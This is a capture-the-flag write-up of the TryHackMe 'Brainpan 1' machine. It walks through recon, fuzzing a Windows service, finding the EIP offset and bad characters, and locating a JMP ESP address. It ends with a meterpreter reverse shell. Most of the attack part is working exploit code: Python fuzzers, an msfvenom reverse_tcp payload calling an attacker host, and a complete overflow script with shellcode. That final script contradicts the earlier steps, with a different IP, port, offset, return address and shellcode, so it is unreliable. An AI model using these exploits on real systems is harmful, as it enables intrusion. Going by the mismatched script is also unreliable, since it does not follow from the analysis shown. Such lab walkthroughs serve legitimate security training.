---
layout: post
title: THM — Brainpan 1
date: 2022-10-06 00:00:00 -500
categories: [TryHackMe]
tags: [Linux, Windows, Buffer Overflow]
---

<img src="/assets/images/THM/Brainpan%201/logo.png" width="20%">

***

<center><strong><font color="White">Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.</font></strong></center>

Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don't give up (or look at writeups), just try harder. 

***

## <strong><font color="#34A5DA">Reccon</font></strong>

First, basic nmap scan for all ports:

```
vladislav@Mac ~ % nmap -p- 10.10.234.243
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-06 09:40 MSK
Nmap scan report for 10.10.234.243
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 931.73 seconds
```

Here we see only 2 open ports. Let's try to get some additional information about it:
```
vladislav@Mac ~ % nmap -sV -sC -p9999,10000 10.10.234.243   
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-06 09:58 MSK
Nmap scan report for 10.10.234.243
Host is up (0.066s latency).

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=10/6%Time=633E7C9C%P=arm-apple-darwin21.6.0%r
SF:(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|
SF:_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x
SF:20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\
SF:|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x2
SF:0\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x2
SF:0\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPA
SF:N\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTE
SF:R\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.82 seconds
```

Going to the website:

<img src="/assets/images/THM/Brainpan%201/1.png" width="80%">


Let's use gobuster for searching for subpages:

```console
vladislav@Mac ~ % gobuster dir -u http://10.10.234.243:10000 -w share/wordlists/dirs/dsstorewordlist.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.234.243:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                share/wordlists/dirs/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/06 11:32:10 Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]
                                                         
===============================================================
2022/10/06 11:32:40 Finished
===============================================================
```

Going to this subpage we can download `brainpan.exe`.

<img src="/assets/images/THM/Brainpan%201/2.png" width="80%">

Let's analyze this file. For this purpose we need to start Immunity Debugger and open our file there.

<img src="/assets/images/THM/Brainpan%201/3.png" width="80%">

We can see in the promt that the service started listening on port 9999 — the second opened port on target machine.

***

## <strong><font color="#34A5DA">Buffer Overflow</font></strong>

First, we need to connect to our VM machine and try to interact with this application. Using netcat:

```bash
netcat 10.211.55.3 9999
```

```
vladislav@Mac ~ % netcat 10.211.55.3 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> pass
                          ACCESS DENIED
```

We see that the app asks for some password and if it's not correct — stops the connection. At the same time the output of the promt on VM look like this:

<img src="/assets/images/THM/Brainpan%201/4.png" width="60%">

First, we need to check the program for buffer overflow vulnerability. I will be using `fuzzer.py` from *Gatekeeper*:

```python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 9999
payload_length = 3000
payload = b'A' * payload_length

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

<img src="/assets/images/THM/Brainpan%201/5.png" width="60%">

The program crashed after sending to it 3002 bytes and we can see that the **EIP** is `41414141` which is `AAAA`. So, we proved the buffer overflow vulnerability.

Next we need to get to know how many bytes are needed to crash the app.

```python
#!/usr/bin/env python3

import socket, sys, time

ip = "10.211.55.3"
port = 9999
timeout = 5

# Creating buffers with different amounts of A's
buffer = []
counter = 100
while len(buffer) < 40:
  buffer.append(b"A" * counter)
  counter += 100

# Fuzzing
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, port))
    print("Fuzzing with %s bytes" % len(string))
    s.send(string + b"\r\n")
    s.recv(1024)
    s.close()
  except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
  time.sleep(1)
```

```console
vladislav@Mac Desktop % python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Could not connect to 10.211.55.3:9999
```

Now we know that the amount of bytes somewhere between 700 and 800. To get to know exactly how many bytes we need we can use a custom string with unique bytes and which bytes will be in EIP register — that are the end bytes.

Using metasploit framework we can create a unique string:

```
┌──(simpuar㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_create.rb -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

```python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 9999
payload_length = 800
payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

<img src="/assets/images/THM/Brainpan%201/6.png" width="80%">

The value of EIP is `3572 4134`

Using metasploit framework we can calculate the offset:

```
┌──(simpuar㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ msf-pattern_offset -l 800 -q 35724134
[*] Exact match at offset 524
```

Now we now the offset: `524`. I will skip the step with checking if we can overwrite ESP with our custom bytes using this offset. 

The next step is to find if there are any badchars.

``` python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 9999
payload_length = 800
offset = 524
payload = b'A' * offset + b'B' * 4
badchars = ( b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + badchars + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

Create a badarray of bad chars and compare it with hex dump using mona:
```
!mona config -set workingfolder Z:\Desktop\
!mona bytearray -b "\x00"
!mona compare -f Z:\Desktop\bytearray.bin -a 025FF880
```

<img src="/assets/images/THM/Brainpan%201/7.png" width="80%">

So there is only one bad char: `\x00`.

Now we can find the bytecode for `JMP ESP` using mona.

```
!mona jmp -r esp -cpb "\x00"
```

<img src="/assets/images/THM/Brainpan%201/8.png" width="80%">

We have only one address. `0x311712F3` will become `\xF3\x12\x17\x31`.

Now we can generate a reverse shell payload using msfvenom:

```console
vladislav@Mac Desktop % msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.7.222 LPORT=4444 -b "\x00" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of c file: 1632 bytes
unsigned char buf[] = 
"\xd9\xeb\xd9\x74\x24\xf4\x58\xba\x9e\x3a\xf6\xa3\x2b\xc9"
"\xb1\x59\x31\x50\x19\x03\x50\x19\x83\xe8\xfc\x7c\xcf\x0a"
"\x4b\x0f\x30\xf3\x8c\x6f\xb8\x16\xbd\xbd\xde\x53\xec\x71"
"\x94\x36\x1d\xfa\xf8\xa2\x96\x8e\xd4\xc5\x1f\x24\x03\xeb"
"\xa0\x89\x8b\xa7\x63\x88\x77\xba\xb7\x6a\x49\x75\xca\x6b"
"\x8e\xc3\xa0\x84\x42\x83\xc1\x08\x73\xa0\x94\x90\x72\x66"
"\x93\xa8\x0c\x03\x64\x5c\xa1\x0a\xb5\xcc\xb2\x55\x15\x67"
"\x8c\x7d\x54\xa4\x88\xb7\x22\x76\xda\x76\x34\x0d\xe8\xf3"
"\xcb\xc7\x20\xc4\x60\x26\x8d\xc9\x79\x6f\x2a\x32\x0c\x9b"
"\x48\xcf\x17\x58\x32\x0b\x9d\x7e\x94\xd8\x05\x5a\x24\x0c"
"\xd3\x29\x2a\xf9\x97\x75\x2f\xfc\x74\x0e\x4b\x75\x7b\xc0"
"\xdd\xcd\x58\xc4\x86\x96\xc1\x5d\x63\x78\xfd\xbd\xcb\x25"
"\x5b\xb6\xfe\x30\xdb\x37\x01\x3d\x81\xaf\xcd\xf0\x3a\x2f"
"\x5a\x82\x49\x1d\xc5\x38\xc6\x2d\x8e\xe6\x11\x24\x98\x18"
"\xcd\x8e\xc9\xe6\xee\xee\xc0\x2c\xba\xbe\x7a\x84\xc3\x55"
"\x7b\x29\x16\xc3\x71\xbd\x93\x01\x81\xe3\xcc\x27\x8d\x0a"
"\x51\xae\x6b\x7c\x39\xe0\x23\x3d\xe9\x40\x94\xd5\xe3\x4f"
"\xcb\xc6\x0b\x9a\x64\x6c\xe4\x72\xdc\x19\x9d\xdf\x96\xb8"
"\x62\xca\xd2\xfb\xe9\xfe\x23\xb5\x19\x8b\x37\xa2\x7d\x73"
"\xc8\x33\xe8\x73\xa2\x37\xba\x24\x5a\x3a\x9b\x02\xc5\xc5"
"\xce\x11\x02\x39\x8f\x23\x78\x0c\x05\x0b\x16\x71\xc9\x8b"
"\xe6\x27\x83\x8b\x8e\x9f\xf7\xd8\xab\xdf\x2d\x4d\x60\x4a"
"\xce\x27\xd4\xdd\xa6\xc5\x03\x29\x69\x36\x66\x29\x6e\xc8"
"\xf4\x06\xd7\xa0\x06\x17\xe7\x30\x6d\x97\xb7\x58\x7a\xb8"
"\x38\xa8\x83\x13\x11\xa0\x0e\xf2\xd3\x51\x0e\xdf\xb2\xcf"
"\x0f\xec\x6e\xe0\x6a\x9d\x91\x01\x8b\xb7\xf5\x02\x8b\xb7"
"\x0b\x3f\x5d\x8e\x79\x7e\x5d\xb5\x72\x35\xc0\x9c\x18\x35"
"\x56\xde\x08";

```

Updating our python script:
```python
#!/usr/bin/env python3

import socket, sys

ip = "10.10.7.45"
port = 31337
payload_length = 300
offset = 146
payload = b'A' * offset + b'\xBF\x16\x04\x08' + b'\x90' * 10

payload += b"\xda\xc1\xbe\xae\x2f\x76\x11\xd9\x74\x24\xf4\x5d\x29\xc9"
payload += b"\xb1\x52\x83\xed\xfc\x31\x75\x13\x03\xdb\x3c\x94\xe4\xdf"
payload += b"\xab\xda\x07\x1f\x2c\xbb\x8e\xfa\x1d\xfb\xf5\x8f\x0e\xcb"
payload += b"\x7e\xdd\xa2\xa0\xd3\xf5\x31\xc4\xfb\xfa\xf2\x63\xda\x35"
payload += b"\x02\xdf\x1e\x54\x80\x22\x73\xb6\xb9\xec\x86\xb7\xfe\x11"
payload += b"\x6a\xe5\x57\x5d\xd9\x19\xd3\x2b\xe2\x92\xaf\xba\x62\x47"
payload += b"\x67\xbc\x43\xd6\xf3\xe7\x43\xd9\xd0\x93\xcd\xc1\x35\x99"
payload += b"\x84\x7a\x8d\x55\x17\xaa\xdf\x96\xb4\x93\xef\x64\xc4\xd4"
payload += b"\xc8\x96\xb3\x2c\x2b\x2a\xc4\xeb\x51\xf0\x41\xef\xf2\x73"
payload += b"\xf1\xcb\x03\x57\x64\x98\x08\x1c\xe2\xc6\x0c\xa3\x27\x7d"
payload += b"\x28\x28\xc6\x51\xb8\x6a\xed\x75\xe0\x29\x8c\x2c\x4c\x9f"
payload += b"\xb1\x2e\x2f\x40\x14\x25\xc2\x95\x25\x64\x8b\x5a\x04\x96"
payload += b"\x4b\xf5\x1f\xe5\x79\x5a\xb4\x61\x32\x13\x12\x76\x35\x0e"
payload += b"\xe2\xe8\xc8\xb1\x13\x21\x0f\xe5\x43\x59\xa6\x86\x0f\x99"
payload += b"\x47\x53\x9f\xc9\xe7\x0c\x60\xb9\x47\xfd\x08\xd3\x47\x22"
payload += b"\x28\xdc\x8d\x4b\xc3\x27\x46\x7e\x06\x20\x48\x16\x24\x2e"
payload += b"\x65\xbb\xa1\xc8\xef\x53\xe4\x43\x98\xca\xad\x1f\x39\x12"
payload += b"\x78\x5a\x79\x98\x8f\x9b\x34\x69\xe5\x8f\xa1\x99\xb0\xed"
payload += b"\x64\xa5\x6e\x99\xeb\x34\xf5\x59\x65\x25\xa2\x0e\x22\x9b"
payload += b"\xbb\xda\xde\x82\x15\xf8\x22\x52\x5d\xb8\xf8\xa7\x60\x41"
payload += b"\x8c\x9c\x46\x51\x48\x1c\xc3\x05\x04\x4b\x9d\xf3\xe2\x25"
payload += b"\x6f\xad\xbc\x9a\x39\x39\x38\xd1\xf9\x3f\x45\x3c\x8c\xdf"
payload += b"\xf4\xe9\xc9\xe0\x39\x7e\xde\x99\x27\x1e\x21\x70\xec\x2e"
payload += b"\x68\xd8\x45\xa7\x35\x89\xd7\xaa\xc5\x64\x1b\xd3\x45\x8c"
payload += b"\xe4\x20\x55\xe5\xe1\x6d\xd1\x16\x98\xfe\xb4\x18\x0f\xfe"
payload += b"\x9c"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

> Note: IP 10.10.7.45 is VM on THM

Listening with Metasploit:
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.18.7.222
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.7.222:4444 
[*] Sending stage (175686 bytes) to 10.10.162.74
[*] Meterpreter session 1 opened (10.18.7.222:4444 -> 10.10.162.74:37355) at 2022-10-06 13:09:32 +0300

meterpreter > sysinfo
Computer        : brainpan
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : brainpan
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

Here we go.